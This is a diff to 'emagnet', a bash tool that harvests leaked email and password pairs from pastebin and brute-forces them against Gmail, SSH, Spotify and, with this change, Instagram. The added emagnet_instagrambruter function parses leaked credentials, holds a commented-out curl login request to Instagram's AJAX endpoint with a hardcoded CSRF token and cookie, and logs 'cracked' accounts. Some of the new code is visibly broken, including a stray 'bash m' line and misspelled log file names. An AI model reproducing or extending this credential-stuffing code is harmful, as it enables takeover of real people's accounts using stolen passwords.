@@ -43,9 +43,10 @@
 #### for leaked email addresses and passwords.                             ####
 ####                                                                       ####
 #### The BruteForce methods has been added for private usage only          ####
-#### Since my memory is like an gold fish and I have alot of different     ####
+#### Mmy memory is like an gold fish and I have alot of different          ####
 #### logins on the web sites emagnet has brute force support for           ####
 ####                                                                       ####
+###############################################################################
 ###############################################################################
 
 ### Want your own banner?
@@ -70,6 +71,7 @@ cat << "EOF"
    `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'
      `'                  `OObNNNNNdOO'                   `'
                            `~OOOOO~'
+
 EOF
 printf "%64s \n\n" | tr ' ' '='
 }
@@ -95,7 +97,7 @@ Usage: ./$basename$0 [--author] [--emagnet] [--option] .....
                       and store e-mail addresses and passwords
                       in sorted day directories.
   -g, --bruteforce    Same as above '-e' with brute-force mode on
-                      - Available options: gmail/ssh/spotify (ssh not available on android)
+                      - Available options: gmail/ssh/spotify/instagram
   -k, --kill          Kill emagnet ghost sessions
   -m, --merge         Merge all log files from incoming to archive
   -M, --move          Move all downloaded files to archive
@@ -148,7 +150,7 @@ emagnet_mustbefilled() {
   if [[ -z "$GBRUTEFORCE"    ]];then sed -i '125d' "$CONF";sed -i '125 i GBRUTEFORCE=false'                                                                                                       "$CONF";fi
   if [[ -z "$SBRUTEFORCE"    ]];then sed -i '126d' "$CONF";sed -i '126 i SBRUTEFORCE=false'                                                                                                       "$CONF";fi
   if [[ -z "$PBRUTEFORCE"    ]];then sed -i '127d' "$CONF";sed -i '127 i PBRUTEFORCE=false'                                                                                                       "$CONF";fi
-  if [[ -z "$ABRUTEFORCE"    ]];then sed -i '128d' "$CONF";sed -i '128 i ABRUTEFORCE=tempalate'                                                                                                   "$CONF";fi
+  if [[ -z "$IBRUTEFORCE"    ]];then sed -i '128d' "$CONF";sed -i '128 i IBRUTEFORCE=false'                                                                                                       "$CONF";fi
   if [[ -z "$BBRUTEFORCE"    ]];then sed -i '129d' "$CONF";sed -i '129 i BBRUTEFORCE=template'                                                                                                    "$CONF";fi
   if [[ -z "$CBRUTEFORCE"    ]];then sed -i '130d' "$CONF";sed -i '130 i CBRUTEFORCE=template'                                                                                                    "$CONF";fi
   if [[ -z "$DBRUTEFORCE"    ]];then sed -i '131d' "$CONF";sed -i '131 i DBRUTEFORCE=template'                                                                                                    "$CONF";fi
@@ -381,6 +383,9 @@ if [[ "$GBRUTEFORCE" = "true" ]]; then
 	  elif [[ "$SBRUTEFORCE" = "true" ]]; then
            printf "%20s \e[1;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
            printf "%64s \n\n" | tr ' ' '='
+	  elif [[ "$IBRUTEFORCE" = "true" ]]; then
+           printf "%17s \e[0;33mINSTAGRAM\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
+           printf "%64s \n\n" | tr ' ' '='
 	  else
            sleep 0
 fi
@@ -402,7 +407,7 @@ emagnet_clear;emagnet_banner
 	  LOGDATE="$(ls $EMAGNET/incoming/|xargs|sed 's/ /, /g')"
            for LOGDATE2 in "$(ls $EMAGNET/incoming/)"; do
             echo -e ",-> Merging logs from: $LOGDATE \n|"
-            logfiles="cracked-ssh-passwords.txt cracked-gmail-passwords.txt cracked-spotify-passwords.txt emagnet.log emails-from-pastebin.txt passwords-from-pastebin.txt pastebin-urls.txt"
+            logfiles="cracked-ssh-passwords.txt cracked-gmail-passwords.txt cracked-instagram-passwords.txt cracked-spotify-passwords.txt emagnet.log emails-from-pastebin.txt passwords-from-pastebin.txt pastebin-urls.txt"
             find $EMAGNET/incoming/*/logs/ -maxdepth 1|sed '/\/$/d' > $HOME/emagnet/.emagnet-temp-merge.txt
             touch "$EMAGNETARCHIVE/logs/$logfiles" &> /dev/null
               while read logs; do 
@@ -432,6 +437,9 @@ if [[ "$GBRUTEFORCE" = "true" ]]; then
            printf "%64s \n\n" | tr ' ' '='
 	  elif [[ "$SBRUTEFORCE" = "true" ]]; then
            printf "%20s \e[1;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
+           printf "%64s \n\n" | tr ' ' '='
+	  elif [[ "$IBRUTEFORCE" = "true" ]]; then
+           printf "%17s \e[0;33mINSTAGRAM\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
            printf "%64s \n\n" | tr ' ' '='
 	  else
            sleep 0
@@ -484,30 +492,49 @@ if [[ "$GBRUTEFORCE" = "true" ]]; then
       	    sed -i '126 i SBRUTEFORCE=false' "$CONF"
             sed -i '127d' "$CONF"
       	    sed -i '127 i PBRUTEFORCE=false' "$CONF"
+            sed -i '128d' "$CONF"
+     	    sed -i '128 i IBRUTEFORCE=false' "$CONF"
             emagnet_conf
             printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
             printf "\n%64s \n\n" | tr ' ' '='
             emagnet_analyzer
 	  elif [[ "$SBRUTEFORCE" = "true" ]]; then
       	    sed -i '125d' "$CONF"
-     	      sed -i '125 i GBRUTEFORCE=false' "$CONF"
+     	    sed -i '125 i GBRUTEFORCE=false' "$CONF"
       	    sed -i '126d' "$CONF"
             sed -i '126 i SBRUTEFORCE=true' "$CONF"
             sed -i '127d' "$CONF"
-     	      sed -i '127 i PBRUTEFORCE=false' "$CONF"
+     	    sed -i '127 i PBRUTEFORCE=false' "$CONF"
+            sed -i '128d' "$CONF"
+     	    sed -i '128 i IBRUTEFORCE=false' "$CONF"
             emagnet_conf
             printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
             printf "\n%64s \n\n" | tr ' ' '='
             emagnet_analyzer
 	  elif [[ "$PBRUTEFORCE" = "true" ]]; then
-	        sed -i '125d' "$CONF"
+	    sed -i '125d' "$CONF"
      	    sed -i '125 i GBRUTEFORCE=false' "$CONF"
       	    sed -i '126d' "$CONF"
      	    sed -i '126 i SBRUTEFORCE=false' "$CONF"
             sed -i '127d' "$CONF"
      	    sed -i '127 i PBRUTEFORCE=true' "$CONF"
+            sed -i '128d' "$CONF"
+     	    sed -i '128 i IBRUTEFORCE=false' "$CONF"
             emagnet_conf
             printf "%20s \e[1;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
+            printf "\n%64s \n\n" | tr ' ' '='
+            emagnet_analyzer
+	  elif [[ "$IBRUTEFORCE" = "true" ]]; then
+	    sed -i '125d' "$CONF"
+     	    sed -i '125 i GBRUTEFORCE=false' "$CONF"
+      	    sed -i '126d' "$CONF"
+     	    sed -i '126 i SBRUTEFORCE=false' "$CONF"
+            sed -i '127d' "$CONF"
+     	    sed -i '127 i PBRUTEFORCE=false' "$CONF"
+            sed -i '128d' "$CONF"
+     	    sed -i '128 i IBRUTEFORCE=true' "$CONF"
+            emagnet_conf
+            printf "%20s \e[0;33mINSTAGRAM\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
             printf "\n%64s \n\n" | tr ' ' '='
             emagnet_analyzer
 	  else
@@ -517,6 +544,8 @@ if [[ "$GBRUTEFORCE" = "true" ]]; then
             sed -i '126 i SBRUTEFORCE=false' "$CONF"
             sed -i '127d' "$CONF"
             sed -i '127 i PBRUTEFORCE=false' "$CONF"
+            sed -i '128d' "$CONF"
+            sed -i '128 i IBRUTEFORCE=false' "$CONF"
             emagnet_analyzer
 fi
 }
@@ -584,6 +613,55 @@ grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$EMAGNETHOME/.temp" \
 fi
     		sleep 4
 }
+
+emagnet_instagrambruter() {
+URL="https://www.instagram.com/accounts/login/ajax/"
+ACCEPTLANG="Accept-Language: sv-SE,en;q=0.7,en-US;q=0.3"
+ACCEPT="Accept: */*'"
+XCSFRTOKEN="X-CSRFToken: dBKbmgDvsJDSVpnMlnX3p7rNViGv0Cps"
+AJAX="X-Instagram-AJAX: 4a1f95f94afb' -H 'X-IG-App-ID: 936619743392459"
+
+    grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
+    |awk '{print $1}' \
+    |cut -d':' -f2,3 \
+    |cut -d'|' -f1 \
+    |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> $HOME/.config/emagnet/tmp/.emagnet-instagram-accounts.txt
+bash m
+
+#while read instagramlogin; do
+#INSTAGRAM_USER="$(echo $instagramlogin|sed 's/:/\&password\=/g')"
+#INSTAGRAM_PASS="$(echo $instagramlogin|cut -d':' -f2)"
+
+# curl -s "${URL}" -H "${USERAGENT}" -H '$ACCEPT' -H "$ACCEPTLANG" --compressed -H "$XCSFRTOKEN" -H "$AJAX" -H 'X-IG-WWW-Claim: 0' -H \
+#'Content-Type: application/x-www-form-urlencoded' -H 'X-Requested-With: XMLHttpRequest' -H \
+#'Connection: keep-alive' -H 'Referer: https://www.instagram.com/accounts/login/?source=auth_switcher' -H \
+#'Cookie: rur=VLL; csrftoken=dBKbmgDvsJDSVpnMlnX3p7rNViGv0Cps; mid=XWyxNwAEAAHy5kJG_MPLMsE7Uzzs' -H 'DNT: 1' -H 'TE: Trailers' --data \
+#"username=$USERNAME"|grep -q 'checkpoint\|authenticated": true'
+if [[ $? -eq "0" ]]; then
+         echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${INSTAGRAM_USER}:${INSTAGRAM_PASS}"
+         echo -e "================================================================"             >>    "$EMAGNETLOGS/cracked-instagram-passwords.txt"
+         echo -e "[+] Login Details For INSTAGRAM - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"        >>    "$EMAGNETLOGS/cracked-instasgram-passwords.txt"
+         echo -e "[+]------------------------------------------------------------"              >>    "$EMAGNETLOGS/cracked-instagram-passwords.txt"
+         echo -e "[+] Username: ${INSTAGRAM_USER}"                                              >>    "$EMAGNETLOGS/cracked-instagram-passwords.txt"
+         echo -e "[+] Password: ${INSTAGRAM_PASS}"                                              >>    "$EMAGNETLOGS/cracked-instsagram-passwords.txt"
+         echo -e "================================================================\n\n"         >>    "$EMAGNETLOGS/cracked-instagram-passwords.txt"
+         echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${INSTAGRAM_USER}:${INSTAGRAM_PASS}"      >>    "$HOME/.config/emagnet/tmp/.emagnet-cracked"
+         echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${INSTAGRAM_USER}:${INSTAGRAM_PASS}"        >>    "$HOME/.config/emagnet/tmp/.emagnet-failed"
+         SUCCEED="$(cat $HOME/.config/emagnet/tmp/.emagnet-instagram-cracked|grep 'Cracked Password'|wc -l)"
+         FAILED="$(cat $HOME/.config/emagnet/tmp/.emagnet-instagram-failed|grep 'Wrong Pasword'|wc -l)"
+         echo -e "[\e[1;32m>>\e[0m] - Cracked Password: $instagramlogin"
+else
+         echo -e "[\e[1;31m<<\e[0m] - Wrong Password: $instagramlogin"
+fi
+#   done < $HOME/.config/emagnet/tmp/.emagnet-instagram-accounts.txt
+         printf "%64s \n" | tr ' ' '='
+         echo -e "Done! Successfully cracked $SUCCEED accounts and $FAILED failed.. \n"
+         sleep 3
+         rm "$HOME/.config/emagnet/tmp/.emagnet-instagram-accounts.txt"
+         sleep 0
+
+}
+
 emagnet_spotify_bruter() {
 # Not in USE, added a backup on my
 # host place if something happends
@@ -591,7 +669,7 @@ VERSION="0.6.0"
 WWWSOURCE="https://nr1.nu/archive/sconsify"
 SCONSIFY="${WWWSOURCE}/linux-x86_64-sconsify-${VERSION}.next.zip"
 SPOTIFY_TARGETS="$HOME/.config/emagnet/tmp/.emagnet-passwords"
-     
+
      grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
     |awk '{print $1}' \
     |cut -d':' -f2,3 \
@@ -605,13 +683,19 @@ SPOTIFY_TARGETS="$HOME/.config/emagnet/tmp/.emagnet-passwords"
 	             if [[ "$?" -eq "0" ]]; then
         	      echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
                else
+     grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
+    |awk '{print $1}' \
+    |cut -d':' -f2,3 \
+    |cut -d'|' -f1 \
+    |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> $HOME/.config/emagnet/tmp/.emagnet-passwords.txt
+
               	        echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
-            		    echo -e "================================================================"      >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
-             		    echo -e "[+] Login Details For SPOTIFY - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"   >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
+            	        echo -e "================================================================"      >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
+             	        echo -e "[+] Login Details For SPOTIFY - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"   >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
               	        echo -e "[+]------------------------------------------------------------"       >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
-             		    echo -e "[+] Username: ${SPOTIFY_USER}"                                         >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
-                       	echo -e "[+] Password: ${SPOTIFY_PASS}"                                         >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
-             		    echo -e "================================================================\n\n"  >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
+             	        echo -e "[+] Username: ${SPOTIFY_USER}"                                         >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
+                      	echo -e "[+] Password: ${SPOTIFY_PASS}"                                         >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
+             	        echo -e "================================================================\n\n"  >>    "$EMAGNETLOGS/cracked-spotify-passwords.txt"
                	        echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}" >>    "$HOME/.config/emagnet/tmp/.emagnet-cracked"
                        	echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"   >>    "$HOME/.config/emagnet/tmp/.emagnet-failed"
                         SUCCEED="$(cat $HOME/.config/emagnet/tmp/.emagnet-cracked|grep 'Cracked Password'|wc -l)" 
@@ -812,6 +896,10 @@ pt=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EM
                                 printf "%64s \n\n" | tr ' ' '='
                                 printf "%15s";printf "BRUTE FORCING -- \e[0;32mSPOTIFY\e[0m ACCOUNTS\e[0m\n\n"
                                 emagnet_spotify_bruter
+                             elif [[ "$IBRUTEFORCE" = "true" ]]; then
+                                printf "%64s \n\n" | tr ' ' '='
+                                printf "%14s";printf "BRUTE FORCING -- \e[0;33mINSTAGRAM\e[0m ACCOUNTS\e[0m\n\n"
+                                emagnet_instagrambruter
                              else
                                 sleep 0
                             fi
@@ -900,6 +988,7 @@ case "${1}" in
         sed -i 's/GBRUTEFORCE=true/GBRUTEFORCE=false/g' "$CONF"
         sed -i 's/SBRUTEFORCE=true/SBRUTEFORCE=false/g' "$CONF"
         sed -i 's/PBRUTEFORCE=true/PBRUTEFORCE=false/g' "$CONF"
+        sed -i 's/IBRUTEFORCE=true/IBRUTEFORCE=false/g' "$CONF"
         emagnet_run4ever
 		  ;;
 
@@ -924,27 +1013,35 @@ case "${1}" in
                emagnet_sshbruter
                mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
               fi
+           elif [[ "$2" = "instagram" ]]; then
+               sed -i 's/IBRUTEFORCE=false/IBRUTEFORCE=true/g' "$CONF"
+               emagnet_conf
+              if [[ "$IBRUTEFORCE" = "true" ]]; then
+               emagnet_run4ever
+               emagnet_instagrambruter
+               mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
+              fi
            elif [[ "$2" = "spotify" ]]; then
               emagnet_conf # We need to use conf here since we edited the PBRUTER in the function so we must source it again
               find /usr/include -type d |grep 'libspotify' &> /dev/null
              if [[ "$?" -ne "0" ]]; then
-              if [[ -z "$LIBSPOTIFY" ]]; then
-	             printf "Libspotify is deprecated but is required for emagnet bruteforcing\nto work, do you have libspotify installed? (YES/no): "
+             if [[ -z "$LIBSPOTIFY" ]]; then
+	       printf "Libspotify is deprecated but is required for emagnet bruteforcing\nto work, do you have libspotify installed? (YES/no): "
                read LIBSPOTIFY
                  if ! [[ "$LIBSPOTIFY" = "YES" ]]; then
-        	        echo "Can't continue until libspotify has been installed.."
-      		        echo "Exiting.."
-       		        exit 1
-         	       fi
-               sed -i '210d' "$CONF"
-               sed -i '210 i LIBSPOTIFY=true' "$CONF"
-             fi
-            else
-               sed -i '210d' "$CONF"
-               sed -i '210 i LIBSPOTIFY=true' "$CONF"
-           fi
-                   # 2ADD! - Check so unzip is installed - Mostly users have it installed so no rush!
-                     ./sconsify -version &> /dev/null
+                   echo "Can't continue until libspotify has been installed.."
+      		   echo "Exiting.."
+       		   exit 1
+         	 fi
+               sed -i '230d' "$CONF"
+               sed -i '230 i LIBSPOTIFY=true' "$CONF"
+            fi
+              else
+               sed -i '230d' "$CONF"
+               sed -i '230 i LIBSPOTIFY=true' "$CONF"
+            fi
+               # 2ADD! - Check so unzip is installed - Mostly users have it installed so no rush!
+               ./sconsify -version &> /dev/null
                         if [[ "$?" -ne "0" ]]; then
                          echo "Sconsify is required to be installed before we attacking targets.."
                            read -p "Download and install sconsify (y/N): " installsconsify
